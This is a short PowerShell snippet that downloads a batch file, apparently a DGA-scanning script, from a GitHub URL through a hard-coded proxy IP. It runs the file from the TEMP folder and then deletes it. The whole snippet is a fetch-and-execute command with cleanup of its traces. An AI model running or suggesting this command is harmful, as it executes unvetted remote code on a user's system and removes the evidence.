Invoke-WebRequest "https://raw.githubusercontent.com/tameval/script/main/124509/proxy/scanning_dga.bat" -Proxy "http://13.231.199.128:3128" -OutFile $env:TEMP\scan.bat
Start-Process -Wait $env:TEMP\scan.bat
Remove-Item $env:TEMP\scan.bat
